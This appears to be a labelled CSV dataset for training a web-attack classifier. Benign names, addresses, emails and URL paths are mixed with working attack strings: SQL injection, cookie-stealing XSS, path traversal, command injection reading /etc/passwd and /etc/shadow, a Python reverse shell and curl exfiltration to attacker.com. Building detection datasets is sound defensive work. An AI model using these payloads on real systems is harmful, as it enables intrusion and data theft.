payload,label
| ${PATH:0:1}bin${PATH:0:1}ls,1
pallars 20 12?a,0
veronese vitte,0
ergasto,0
8678590960416701,0
sincopar,0
mundy,0
/index.php?page=book530,0
/login?redirect_url=/dashboard/user/808980,0
"1) where 8630=8630 union all select null,null--",1
"1%"" union all select null,null,null,null,null#",1
nepor-leonov@telogis.bn,0
1%')));select case when 7717=7717 then 1 else null end--,1
cholgua,0
"1'+(select 'cwta' where 6091=6091;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual)+'",1
| ls -la ~,1
"parque barranco de coquin 67, 8?d",0
24596413y,0
villafrechs,0
/product/detail?user=apple651,0
6446364885360152,0
8259767534834623,0
/api/v1/users?category=book366,0
25341,0
/api/v1/auth?token=ULiuOSzj,0
"1') as ywtu where 3009=3009 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
1)) or (select * from (select(sleep(5)))ydpu) and ((7805=7805,1
/api/v1/auth?token=o5IVBZsJ,0
/login?redirect_url=/dashboard/user/405940,0
/api/v1/auth?token=4HPom6XO,0
/assets/style.css?id=shoes432,0
/product?id=169512&utm_source=facebook&campaign=sale,0
"-8506'))) union all select 1950,1950,1950,1950,1950,1950--",1
1) as bzuh where 8041=8041 and 6307=9200#,1
"<STYLE type=""text/css"">BODY{background:url(""javascript:document.cookie=true"")}</STYLE>",1
/search?category=2026614,0
/assets/style.css?category=profile397,0
masip,0
/login.html?id=shoes971,0
cambiazo,0
calle buenos aires 82 5-d,0
2485308810386739,0
sadoyama,0
/home?token=123262,0
grisel,0
sonne,0
cybotech,0
/team/verona/2Ilmh4oH/statistics,0
15256,0
16311,0
muopedro,0
/product?id=391355&utm_source=facebook&campaign=sale,0
gabby,0
/api/v1/users?category=book415,0
"1')) as yyud where 4934=4934;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",1
clipsham5,0
/login?redirect_url=/dashboard/user/697949,0
"1"" where 5062=5062;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1
/api/v1/users?q=hải392,0
anys@ebuy.com.tr,0
manumiti6,0
/product?id=191186&utm_source=facebook&campaign=sale,0
0076747388160328,0
"1%"") and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (""%""=""",1
-3966') or 7338=8657,1
"1%"" and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ""%""=""",1
/product/detail?user=book937,0
76518142v,0
/product?id=725169&utm_source=facebook&campaign=sale,0
/product/detail?id=apple419,0
"1') as afnt where 4719=4719 and elt(8224=1275,1275)--",1
shukuri@velaconsultores.nl,0
"-1258"")) union all select 7734,7734,7734#",1
d37t30,0
"1"")) as nsbu where 6569=6569 or sleep(5)#",1
<script>document.cookie=true;//<</script>,1
glyn7,0
/product/detail?token=apple144,0
poveda,0
cecon5,0
/api/v1/users?id=hải6,0
/team/verona/LPGk9gH0/statistics,0
"1%' (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and '%'='",1
sheree,0
tierga,0
dionisio,0
ausent+e,0
/login.html?user=hải263,0
acopetado,0
%3C%69%66%72%61%6D%65%20%73%72%63%3D%68%74%74%70%3A%2F%2F%74%65%73%74%2E%64%65%3E,1
goldsmith1@esmarbella.ht,0
/login.html?category=admin472,0
/api/v1/auth?token=NxvzheaB,0
registro,0
1%') rlike sleep(5) and ('%'=',1
aracena,0
1%' waitfor delay '0:0:5'--,1
/login.html?token=2026560,0
/index.php?token=apple385,0
"1' union all select null,null,null,null--",1
; whoami;#,1
/login.html?q=profile179,0
"1'))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('vjkf' like 'vjkf",1
6e0turer2,0
/product/detail?id=123883,0
kennie,0
"1"" and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ""buzb""=""buzb",1
& cat /etc/shadow,1
1' and (3020=3020)*6703 and 'tmng' like 'tmng,1
8515880791800894,0
45478096n,0
kappa,0
">""<SCRIPT>a=/CrossSiteScripting/\ndocument.cookie=true;</SCRIPT>",1
rayen,0
"1') where 8255=8255 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
48,0
"1%"");select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",1
"1%'))) and 8407=(select count(*) from generate_series(1,5000000)) and ((('%'='",1
enconadura,0
"{""id"": ""1' OR 1=1--""}",1
puri@espaciodelpintor.er,0
torvizcn,0
"calle miguel hernandez, 195,",0
"rua picouto, 14,",0
malva,0
"-7845' union all select 9574,9574,9574,9574,9574,9574#",1
urgeles montanuy,0
1%';begin dbms_lock.sleep(5); end--,1
stoevsky,0
-4308') or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('jmot'='jmot,1
mccollum.hemsley@cursosdele.bg,0
9106,0
21762453z,0
<iframe id=xss///////onload=alert(/xss/)></iframe>,1
/team/verona/IHUq13si/statistics,0
"1')) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (('igqm'='igqm",1
madan deluca,0
"1' and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
lloros*o,0
"1'+(select 'arqt' where 2336=2336 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
1')) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('qtul' like 'qtul,1
92621448b,0
eastman@beesmer.lu,0
/api/v1/users?q=2026229,0
pa24dan3cea,0
1'||(select 'ucro' where 9912=9912 and 8594=(select 8594 from pg_sleep(5))--,1
abdushilov@mundoapple.kn,0
-3566%' or 2158=6289,1
/product/detail?q=profile591,0
"c/ arbitro eduardo vidal torres, 12, 4c",0
"-9630%"" union all select 8592,8592,8592,8592--",1
"1)) union all select null,null,null,null,null,null,null,null,null,null#",1
"1,(select (case when (4828=2600) then 1 else 1/(select 0) end))",1
1745,0
urdua-ordua,0
42520233h,0
-7164%' or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and '%'=',1
9136,0
"1%""))) union all select null,null,null,null,null,null--",1
"chorrito bajo, 11",0
pl. guerrero strachan s/n 4-a,0
equilibrio,0
/team/verona/sPZETlKa/statistics,0
"1"")) as nwnp where 6140=6140;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1
/login?redirect_url=/dashboard/user/550431,0
adepto,0
ahern.plott@zonamodelos.fr,0
teitelba,0
1%')) or 4240=(select 4240 from pg_sleep(5))--,1
"1) and make_set(1559=4863,4863)",1
aljuba,0
/api/v1/users?id=2026836,0
/api/v1/auth?token=fyXuKTRm,0
carretera castilla 139 9?f,0
1' in boolean mode) and 7533=7533#,1
/api/v1/users?id=2026672,0
/login.html?id=shoes901,0
/team/verona/rS9IADZb/statistics,0
c/ virgen del pilar 144,0
carrera,0
4801521190112771,0
/team/verona/Z2z1Ez0x/statistics,0
/login?redirect_url=/dashboard/user/516144,0
"' UNION SELECT 1,2,3--",1
/index.php?category=apple38,0
"-7889"")) as oayf where 1765=1765 or 8571=8571--",1
1');select sleep(5) and ('hhlq' like 'hhlq,1
"1"")) as hfma where 2654=2654 and make_set(8403=8403,8899)--",1
"1'||(select 'nbmo' from dual where 5572=5572 and 8635=(select count(*) from generate_series(1,5000000))--",1
/api/v1/auth?token=36eTvzGC,0
biurrun-olcoz,0
/team/verona/hQ7z5fDP/statistics,0
shepperd,0
/login?redirect_url=/dashboard/user/783146,0
tutusaus tenza,0
"pasaje pedrosa 115, 6f",0
/index.php?id=2026288,0
/....................................................................................{file},1
vlahos,0
/assets/style.css?user=apple491,0
mazanett crdoba,0
08zaril0o,0
/product/detail?category=2026236,0
20150,0
"<a href=""javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;""><button>",1
1 where 7890=7890 or sleep(5)--,1
jiinshuh,0
/assets/style.css?id=profile65,0
8365998592191509,0
raymona,0
1'||(select 'irfn' where 8360=8360;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,1
benaprs vaqu,0
\r ls,1
penido maym'o,0
rigaud@arroyo-molinos.an,0
dederika,0
men3pea,0
sensiblemente,0
"vendeja, 1,",0
/login?redirect_url=/dashboard/user/735815,0
/i{file},1
172,0
cervatos de la cueza,0
"1"")) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
arimany aguila,0
\%22))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//,1
"1') where 2928=2928;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1
"-2568"") or (8459=8459)*4906 and (""exyw""=""exyw",1
salerno.harmer@nexuspark.li,0
; echo vulnerable | tr 'a-z' 'A-Z',1
/product/detail?page=2026521,0
viladecavalls,0
7752644300025700,0
/home?user=contact947,0
48289,0
/api/v1/auth?token=1CvwRYCh,0
buchko,0
"1) as tkkn where 7832=7832 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",1
"""/><script>alert(document.cookie);</script>",1
"1""));select sleep(5) and ((""vzye""=""vzye",1
trixy,0
grea,0
/api/v1/auth?token=kjrZmdLF,0
menelao,0
mahbeer,0
||  cat /etc/passwd,1
"1'))) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((('msol'='msol",1
berg@esposo.com.ve,0
/assets/style.css?q=contact379,0
/api/v1/users?category=2026786,0
$&&dir+c:/,1
ineluctable,0
/home?user=kma527,0
/product?id=76667&utm_source=facebook&campaign=sale,0
11140,0
san cebrin de mud,0
ch61c795,0
/team/verona/OWW2DE9g/statistics,0
/index.php?token=admin957,0
09840824k,0
/product?id=986148&utm_source=facebook&campaign=sale,0
raina.schiavelli@hosterialasmajadillas.de,0
1')) as sjzf where 9997=9997 and 4193=5408,1
"1"") as jqli where 7793=7793;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1
-3100') or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('etuj' like 'etuj,1
"1) where 1193=1193 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",1
"-1040 where 3058=3058 union all select 3058,3058,3058,3058,3058,3058,3058,3058,3058,3058--",1
veracruz,0
gueldos donohue,0
-3304')) order by 1--,1
soportador,0
"1%"");iif(5257=5257,1,1/0)",1
/search?q=kma454,0
horatio,0
"<DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))"">",1
/team/verona/Cj4o6N6C/statistics,0
1') as pogx where 4105=4105 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,1
"paseo francisco mir berlanga 141, 12-e",0
"1%"") and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
/api/v1/users?token=hải202,0
">""<div style=""width: expression(document.cookie=true);"">",1
/team/verona/ng0YtkF6/statistics,0
12186635q,0
"1"")) and 8635=(select count(*) from generate_series(1,5000000))--",1
/home?page=book49,0
/login?redirect_url=/dashboard/user/328135,0
/team/verona/ocMtBzsR/statistics,0
ambros,0
1523492896649032,0
60219106t,0
"-9558""))) union all select 2935,2935,2935,2935,2935--",1
"1""))) union all select null,null,null,null,null,null,null--",1
p5lm9269,0
in4o75u1t4!bili0a1,0
/login.html?page=2026653,0
brandt,0
/product?id=469366&utm_source=facebook&campaign=sale,0
"1"")));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",1
"| python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""attacker.com"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1
steele-kripilani@vendomiatico.se,0
/search?token=profile641,0
clarance6,0
65456048a,0
ca6oletero,0
8249,0
janenna,0
/api/v1/users?page=admin159,0
69557398q,0
amlani,0
8164,0
1')) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (('yhku' like 'yhku,1
gtova,0
vellora,0
48310,0
| tar czf - /var/www | curl -X POST -d @- http://attacker.com,1
"1""));select (case when (3499=4209) then 3499 else 3499*(select 3499 from mysql.db) end)#",1
roch segui,0
/product/detail?token=shoes85,0
/login.html?id=123889,0
54430634f,0
94046799y,0
/team/verona/aJcTFumy/statistics,0
"-3472' or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))",1
/index.php?q=hải931,0
"1"")) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((""pebw"" like ""pebw",1
/team/verona/AqlWcxAu/statistics,0
"><script>alert(""vlab"")</script>",1
/product?id=526077&utm_source=facebook&campaign=sale,0
/assets/style.css?category=202657,0
pinnow.mcmillan3@hipernavarra.mm,0
"1%'))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((('%'='",1
yoselie,0
"passatge de felipe de paz 31, 8?b",0
/team/verona/ftnf69vh/statistics,0
/login.html?category=shoes467,0
"calle santa apolonia, 47,",0
sincr5nica,0
/team/verona/zjKMTxND/statistics,0
diago dardn,0
me73ga,0
lobera,0
03837,0
"1%""));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((""%""=""",1
/login.html?page=2026656,0
/home?page=123196,0
1'+(select 'xbyn' where 6881=6881;begin user_lock.sleep(5); end)+',1
/login?redirect_url=/dashboard/user/240125,0
"calle neptuno 162,",0
/api/v1/auth?token=wWvofh4E,0
quiliano,0
cristy,0
/product/detail?q=apple338,0
2u27lad9r4,0
"1') or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))",1
nolen@enmenorca.com.th,0
/team/verona/Z3tOFd3L/statistics,0
trikonis_ruschel@beatrizbalado.zw,0
"1%"";select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""%""=""",1
/api/v1/auth?token=GHNcY1Oe,0
37650,0
nuo,0
/login.html?q=apple78,0
....web-infweb.xml,1
/api/v1/auth?token=qsNdCAp0,0
3616118295208716,0
desamueblar,0
/login?redirect_url=/dashboard/user/526077,0
19294,0
/home?token=hải665,0
cha$9i74r0,0
47gent1r,0
"<BGSOUND SRC=""javascript:alert('XSS');"">",1
"<? echo('<SCR)';echo('IPT>alert(""XSS"")</SCRIPT>'); ?>",1
terrassa,0
&& curl -X POST -d @/etc/passwd http://attacker.com/receive,1
borriol,0
/search?page=profile17,0
01062744y,0
/login?redirect_url=/dashboard/user/732908,0
/home?token=123800,0
ardie9temente,0
/product/detail?token=123147,0
lacey@bwds.mp,0
f1581il2ente,0
"c/ astilleros, 129,",0
;cat /etc/passwd;,1
/product/detail?id=book247,0
"1'))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ((('nsji'='nsji",1
6742076773015534,0
|cat /etc/passwd;,1
/api/v1/auth?token=plkxwXpe,0
nealson,0
/product?id=763158&utm_source=facebook&campaign=sale,0
"-5672%"" or 3825=9675--",1
99631010r,0
"plaa solsones s/n,",0
"1') as najc where 5213=5213 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",1
| cat /etc/passwd\r,1
"1) where 2232=2232;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1
/login?redirect_url=/dashboard/user/468107,0
nhat,0
"plaa zenobia camprubi, 81, 13-d",0
83817692b,0
/team/verona/1thIfHyQ/statistics,0
1');select (case when (3855=3855) then 3855 else 1/(select 0) end)--,1
/home?category=profile542,0
"1"") union all select null,null,null,null,null,null,null,null,null,null#",1
grodecki,0
4234394543607287,0
turcot,0
"1) where 2678=2678 union all select null,null,null,null,null,null,null,null,null#",1
"1'))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((('vpus'='vpus",1
giovannina,0
7553,0
"1""))) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (((""zzcd""=""zzcd",1
/login?redirect_url=/dashboard/user/569774,0
/product?id=958099&utm_source=facebook&campaign=sale,0
23763353y,0
0esino1o,0
/team/verona/Qgz4RVZP/statistics,0
1')) and 6969=(select 6969 from pg_sleep(5)) and (('glfq' like 'glfq,1
49394,0
1'||(select 'yyil' from dual where 3121=3121;if(2695=9045) select 2695 else drop function qmno--,1
/product/detail?category=book989,0
probtica,0
/product?id=9036&utm_source=facebook&campaign=sale,0
pager@cocheacoche.ws,0
"1"" and 8635=(select count(*) from generate_series(1,5000000))--",1
/index.php?page=hải514,0
/team/verona/PaZsWIYo/statistics,0
skedelsk,0
81506228r,0
"virgen del valle, 40",0
abelli blasi,0
3909891121634471,0
a);/usr/bin/id;,1
"1%"" or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ""%""=""",1
28749,0
"-2071 union all select 4753,4753--",1
/login?redirect_url=/dashboard/user/725274,0
/login.html?page=apple181,0
"1%""));select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",1
/product?id=870135&utm_source=facebook&campaign=sale,0
"<XML ID=""xss""><I><B><IMG SRC=""javas<!-- -->cript:alert('XSS')""></B></I></XML><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN>",1
/product/detail?page=123514,0
/team/verona/hWm3AiGl/statistics,0
"1%""))) rlike (select * from (select(sleep(5)))sgvo) and (((""%""=""",1
/api/v1/auth?token=810w3dlJ,0
/login?redirect_url=/dashboard/user/939591,0
goman@fbi-criminal-network.com.mh,0
/login?redirect_url=/dashboard/user/245044,0
1');select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,1
/search?category=admin926,0
/login.html?category=shoes616,0
/search?token=kma258,0
56359685w,0
`false`,1
/product?id=36507&utm_source=facebook&campaign=sale,0
"<? echo('<scr)';echo('ipt>alert(""xss"")</script>'); ?>",1
d9str7par,0
22484,0
/login?redirect_url=/dashboard/user/153607,0
"-2378"" where 2686=2686 or 6872=6872--",1
09312,0
pola,0
/index.php?id=123586,0
36823414t,0
/team/verona/HjBjH7vZ/statistics,0
01632755p,0
"-7564') as nank where 8095=8095 union all select 8095,8095,8095--",1
sant jaume de llierca,0
/search?q=hải628,0
entrever,0
1%');begin user_lock.sleep(5); end and ('%'=',1
70825753j,0
deyecta,0
"c/ cierzo, 189,",0
/assets/style.css?user=shoes478,0
/product/detail?category=kma5,0
"1"")) rlike sleep(5) and ((""fzlr""=""fzlr",1
"1'||(select 'bqhi' from dual where 7409=7409;call regexp_substring(repeat(right(char(3702),0),500000000),null))||'",1
nichole,0
benajas rodrguez,0
/product?id=712851&utm_source=facebook&campaign=sale,0
/api/v1/users?user=hải919,0
/product/detail?user=hải458,0
c/ costa i llobera 83,0
/product?id=414939&utm_source=facebook&campaign=sale,0
file:........................etcpasswd,1
"1"" where 5098=5098 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--",1
co65025,0
papali$no,0
9227,0
/assets/style.css?id=hải428,0
/product?id=809669&utm_source=facebook&campaign=sale,0
churriana de la vega,0
4132414285335498,0
"-4285'))) union all select 8819,8819,8819,8819,8819,8819,8819,8819#",1
/product?id=686338&utm_source=facebook&campaign=sale,0
/search?page=hải970,0
47355557y,0
/assets/style.css?id=admin650,0
21254057x,0
/product/detail?page=admin580,0
/api/v1/users?id=2026866,0
co8mov8mi886o,0
"carrera 55,",0
fajardos espuna,0
0003204654562755,0
tahsin,0
/index.php?category=profile484,0
1%'));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,1
5719365905876928,0
1%') waitfor delay '0:0:5'--,1
'| whoami | #,1
"1');select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",1
/product?id=153275&utm_source=facebook&campaign=sale,0
/index.php?page=hải598,0
kaile,0
18518,0
/team/verona/SwYaw5lM/statistics,0
"1')) as fjbe where 4662=4662 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
42120,0
"1%"" or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ""%""=""",1
oroz-betelu,0
"1%""))) and elt(3114=3114,sleep(5))#",1
escriv,0
2451542120615034,0
"-5062""))) union all select 4125,4125--",1
2el6s,0
/home?id=contact717,0
en9r195d9,0
"-8703') where 9723=9723 union all select 9723,9723,9723,9723,9723#",1
"1'))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('sdnc'='sdnc",1
/..../..../..../..../..../..../..../..../{file},1
/login?redirect_url=/dashboard/user/605431,0
/api/v1/users?token=shoes814,0
seye-brofeldt@naturalagricolacantabria.pn,0
"1%""))) and elt(9524=1124,1124) and (((""%""=""",1
2499149169058216,0
ying-chieh0@etnics.mn,0
3307,0
mentecapta,0
fincias alcoriza,0
xtiva,0
/login.html?id=hải159,0
/index.php?id=shoes768,0
/product?id=712032&utm_source=facebook&campaign=sale,0
1'||(select 'jslz' where 8405=8405 rlike (select * from (select(sleep(5)))sgvo))||',1
"1'||(select 'aevx' from dual where 9999=9999;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5))||'",1
1) and 6969=(select 6969 from pg_sleep(5)),1
/api/v1/users?user=contact429,0
"1"") as dgzf where 4834=4834;select (case when (2161=4328) then 2161 else 2161*(select 2161 from mysql.db) end)#",1
hussenot@habitaciondepanico.cl,0
1022652655889356,0
1'+(select cxvy where 7421=7421;begin user_lock.sleep(5); end)+',1
/login.html?page=kma967,0
/login?redirect_url=/dashboard/user/344385,0
carataunas,0
c/ sarasate 143,0
/index.php?page=kma657,0
/login?redirect_url=/dashboard/user/79832,0
"1)) as xutu where 5811=5811 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
58,0
/login?redirect_url=/dashboard/user/739584,0
"1'))) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",1
/product?id=935698&utm_source=facebook&campaign=sale,0
1)));(select * from (select(sleep(5)))srmq) and (((3124=3124,1
& hostname,1
17739088q,0
/team/verona/CSpw5T9B/statistics,0
1));select (case when (3855=3855) then 3855 else 1/(select 0) end)--,1
"<meta http-equiv=""set-cookie"" content=""userid=<script>alert('crosssitescripting')</script>"">",1
8554607392278464,0
proscribir,0
/assets/style.css?id=apple125,0
/index.php?user=hải594,0
0338196248842458,0
westermeier,0
/login?redirect_url=/dashboard/user/172982,0
44711,0
/assets/style.css?id=book789,0
co3tra3tiv7,0
"-9854%""))) or 6455=3652",1
/product/detail?token=kma350,0
/team/verona/3Vd6eDwJ/statistics,0
</title><!-- --><body onload=alert(1);></iframe src=http://google.com>-->,1
/team/verona/pcCAa5h4/statistics,0
15820845l,0
"1"") where 8953=8953 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
/product?id=916878&utm_source=facebook&campaign=sale,0
/home?id=contact355,0
/product/detail?page=profile938,0
"1%"")) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
"-9179"") union all select 7144,7144,7144,7144,7144,7144,7144,7144--",1
/api/v1/auth?token=DNNTO0uX,0
"1"")) rlike (select (case when (5342=1036) then 1 else 0x28 end)) and ((""ntdz"" like ""ntdz",1
"-8810') or make_set(9354=9354,7185) and ('prsn' like 'prsn",1
$(whoami) && echo 'test',1
lopiano,0
/login.html?category=2026163,0
"1"")) as ikuz where 7385=7385;select sleep(5)#",1
ulric,0
"1') where 9381=9381 or elt(6272=6272,sleep(5))--",1
/product/detail?token=shoes908,0
1%' and (select * from (select(sleep(5)))gcrr)#,1
49135,0
"1' in boolean mode);select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3#",1
"1"")) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ((""nbfe""=""nbfe",1
"1'||(select 'fzcu' where 9252=9252 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1))||'",1
1) where 1929=1929 and (select * from (select(sleep(5)))fzno)--,1
"<textarea id=xss onfocus=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>",1
48128,0
/login?redirect_url=/dashboard/user/339202,0
/home?page=2026844,0
/product?id=73901&utm_source=facebook&campaign=sale,0
villacastn,0
anguciana,0
1';select pg_sleep(5),1
/team/verona/AT30OZCS/statistics,0
"fundidores, 179,",0
/login.html?q=book723,0
vilassar de mar,0
/api/v1/users?user=admin532,0
els,0
-1765') order by 1--,1
"1%' or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
|| uname -a,1
6188,0
"plaa creu gran, 65",0
22468230j,0
meier,0
"1')) as qhpv where 7049=7049 and make_set(8403=8403,8899)--",1
1' in boolean mode);if(7899=7899) select 7899 else drop function zbbp--,1
/team/verona/QG0UCHfO/statistics,0
; echo Y2F0IC9ldGMvcGFzc3dkCg== | base64 -d | sh,1
/api/v1/auth?token=HzvHkYVo,0
/assets/style.css?id=shoes829,0
/login?redirect_url=/dashboard/user/911272,0
villanueva del fresno,0
02649,0
"-4694') where 1501=1501 union all select 1501,1501,1501,1501,1501,1501#",1
7771884953425478,0
-2797'))) union all select 5711#,1
/login?redirect_url=/dashboard/user/725040,0
beato,0
